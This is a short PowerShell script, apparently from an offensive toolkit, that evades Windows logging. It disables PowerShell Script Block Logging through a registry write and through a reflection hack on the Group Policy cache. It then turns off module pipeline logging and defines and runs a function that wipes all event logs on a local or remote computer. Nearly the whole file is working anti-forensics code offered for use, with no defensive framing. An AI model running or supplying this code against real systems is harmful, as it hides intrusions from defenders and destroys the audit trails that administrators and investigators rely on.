
#
# Beware can you patch a Tracing Event and some of these block require Administrative access!
# 



#
# Disable Script Block Logging
#

# If you have a misconfiguration or Administrative access to modify the registry hive:
# Disable script Block logging - Windows PowerShell version 4+
$basePath = 'HKLM:\Software\Policies\Microsoft\Windows' + '\PowerShell\ScriptBlockLogging'
Set-ItemProperty $basePath -Name EnableScriptBlockLogging -Value "0"

# 
# If Group Policy is modifiable  
$GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings', 'NonPublic,Static');
  If ($GroupPolicyField) {
      $GroupPolicyCache = $GroupPolicyField.GetValue($null);
      If ($GroupPolicyCache['ScriptBlockLogging']) {
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0;
          $GroupPolicyCache['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0;
      }
      $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new();
      $val.Add('EnableScriptBlockLogging', 0);
      $val.Add('EnableScriptBlockInvocationLogging', 0);
      $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = $val
  };


# 
# Disable Module Logging for PowerShell for current session
#
# Get target module
$module = Get-Module Microsoft.PowerShell.Utility 
# Set module execution details to false
$module.LogPipelineExecutionDetails = $false 
# Get target ps-snapin
$snap = Get-PSSnapin Microsoft.PowerShell.Core 
# Set ps-snapin execution details to false
$snap.LogPipelineExecutionDetails = $false 

# Clear all Event Logs
function clear-all-event-logs ($computerName="localhost")
{
   $logs = Get-EventLog -ComputerName $computername -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -ComputerName $computername -LogName $_ }
   Get-EventLog -ComputerName $computername -list
}

clear-all-event-logs -ComputerName $computername


